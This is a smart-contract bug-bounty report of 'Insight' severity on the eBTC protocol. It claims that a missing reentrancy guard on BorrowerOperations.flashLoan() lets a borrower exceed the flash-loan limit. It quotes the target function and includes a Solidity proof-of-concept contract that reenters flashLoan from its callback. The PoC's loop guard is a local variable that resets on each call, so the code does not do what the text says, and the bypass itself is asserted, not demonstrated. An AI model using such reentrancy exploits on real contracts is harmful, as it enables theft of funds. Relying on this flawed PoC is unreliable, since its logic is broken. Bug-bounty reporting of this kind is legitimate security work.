# 28713 - \[SC - Insight] Reentrancy on BorrowerOperations allows users t...

Submitted on Feb 24th 2024 at 19:57:39 UTC by @shanb1605 for [Boost | eBTC](https://immunefi.com/bounty/ebtc-boost/)

Report ID: #28713

Report type: Smart Contract

Report severity: Insight

Target: <https://github.com/ebtc-protocol/ebtc/blob/release-0.7/packages/contracts/contracts/BorrowerOperations.sol>

Impacts:

* Contract fails to deliver promised returns, but doesn't lose value

## Description

***Permalink:*** <https://github.com/ebtc-protocol/ebtc/blob/a96bd000c23425f04c3223a441a625bfb21f6686/packages/contracts/contracts/BorrowerOperations.sol#L1091>

## Brief/Intro

The `flashLoan()` allows users to borrow ebtc on BorrowerOperations. The amount that can be borrowed is limited to maxFlashLoan(token) means one can borrow within the maximum limit of the amount. This limit can be bypassed with a reentrant call on the `flashLoan()` function.

## Vulnerability Details

The BorrowerOperations contract misses reentrancy protection on flashLoan() which leads to borrowing over the max borrowing limit of the token.

```solidity
    function flashLoan(
        IERC3156FlashBorrower receiver,
        address token,
        uint256 amount,
        bytes calldata data
    ) external override returns (bool) {
        require(amount > 0, "BorrowerOperations: 0 Amount");
        uint256 fee = flashFee(token, amount); // NOTE: Check for `eBTCToken` is implicit here // NOTE: Pause check is here
        require(amount <= maxFlashLoan(token), "BorrowerOperations: Too much");

        // Issue EBTC
        ebtcToken.mint(address(receiver), amount);

        // Callback
        require(
            receiver.onFlashLoan(msg.sender, token, amount, fee, data) == FLASH_SUCCESS_VALUE,
            "IERC3156: Callback failed"
        );

        // Gas: Repay from user balance, so we don't trigger a new SSTORE
        // Safe to use transferFrom and unchecked as it's a standard token
        // Also saves gas
        // Send both fee and amount to FEE_RECIPIENT, to burn allowance per EIP-3156
        ebtcToken.transferFrom(address(receiver), feeRecipientAddress, fee + amount);

        // Burn amount, from FEE_RECIPIENT
        ebtcToken.burn(feeRecipientAddress, amount);

        emit FlashLoanSuccess(address(receiver), token, amount, fee);

        return true;
    }
```

## Impact Details

***Contract fails to deliver promised returns, but doesn't lose value:*** The contract promises to lend within the maximum flash loan amount to the users. However, the malicious users can re-enter the `flashloan()` function and borrow above the maximum limit. Hence, the contract fails to deliver the promise.

## References

MakerDao has Reentrancy Protection on the FlashLoan module: <https://github.com/makerdao/dss-flash/blob/9d492aa6148c35f568400a1ab85cd6df43b2ccc8/src/flash.sol#L74>

<https://github.com/makerdao/dss-flash/blob/9d492aa6148c35f568400a1ab85cd6df43b2ccc8/src/flash.sol#L137>

## Proof of Concept

* First `call_Flashloan()` is executed to borrow the max amount of ebtc.
* Inside `onFlashLoan` `some_actions()` will executed to borrow again the ebtc from the BorrowerOperations contract.
* It sets `attack_done = true` to prevent an unbounded loop.
* Further actions will be carried out with the Flash Loan amount.

```solidity
pragma solidity ^0.8.0;

interface BorrowerOperations {
    function flashLoan(address receiver,address token,uint256 amount,bytes calldata data) external;
}

contract FlashLoan_Receiver {
    bytes32 public constant FLASH_SUCCESS_VALUE = keccak256("ERC3156FlashBorrower.onFlashLoan");

    function call_Flashloan() external {
        BorrowerOperations(address(1)).flashLoan(address(this), address(0xeee),12301300,"");
    }

    function onFlashLoan(address,address,uint256,uint256,bytes memory) external returns(bytes32) {
        some_actions();
        return FLASH_SUCCESS_VALUE;
    }

    function some_actions() internal {
        bool attack_done;
        if(!attack_done) {
            attack_done = true;
            BorrowerOperations(address(1)).flashLoan(address(this), address(0xeee),12301300,"");
        }
    }

}
```
